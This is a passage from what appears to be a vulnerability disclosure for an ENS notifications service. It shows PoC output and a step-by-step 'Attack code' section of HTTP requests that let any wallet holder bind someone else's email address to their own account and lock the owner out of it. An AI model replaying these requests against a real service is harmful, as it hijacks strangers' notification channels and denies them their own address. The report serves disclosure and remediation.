    ATTACKER  0x19E7E376...86DAff2A   no channel    victim@example.com, verified
------------------------------------------------------------------------------

  victim@example.com is enrolled on the attacker's ENS account and receives that
  account's notification mail. The address's owner is refused when they add the
  same address to their own ENS account, and their settings page shows nothing.

  PoC PASSED, every assertion held.
```

`victim@example.com` went from holding no ENS channel at all to being a verified channel on the attacker's account with one queued ENS delivery addressed to it, while its own owner was refused that address on their own account with a 400.

## Attack code

```http
# 1. Any wallet. The target's own SIWE login, no privilege of any kind.
POST /auth/nonce
POST /auth/login
{"address": "<attacker>", "message": "<siwe>", "signature": "<secp256k1>", "nonce": "<nonce>"}
```

```http
# 2. Put someone else's address on the attacker's account. email.ts:59-72 finds no
#    verified row for it, so the cross-user check passes.
POST /notifications/channels/email
Authorization: Bearer <attacker JWT>
{"email": "victim@example.com"}
-> 200 {"message":"Verification email sent","channelId":"01a07184-45d2-0764-aefe-2416254e8aa0"}
```

```
# 3. ENS composes and sends the mail itself, from noreply@ens.dev to victim@example.com:
#      Verify your email address - ENS Notifications
#      https://app.ens.dev/notifications/channels/email/verify?token=dea37167bb95a435dac4ecf1aa62db3a
#    The attacker never sees that token.
```

```http
# 4. The address's owner opens the ENS mail and presses "Verify Email Address".
#    The Manager sends this. No Authorization header, no wallet, no signature.
POST /notifications/channels/email/verify
{"token": "dea37167bb95a435dac4ecf1aa62db3a"}
-> 200 {"message":"Email verified successfully"}
#    user_channels: { attacker, victim@example.com, verified }
```

```http
# 5. ENS notifications for the attacker's account go to that mailbox, and the
#    address's owner is refused their own address on their own account.
POST /notifications/channels/email
Authorization: Bearer <victim JWT>
{"email": "victim@example.com"}
-> 400 {"error":"This email address is already linked to another account"}
```

```
plant : POST /notifications/channels/email {"email": "<anyone's address>"}   // one request, any wallet
fire  : that address's owner presses "Verify Email Address" in the ENS mail
```
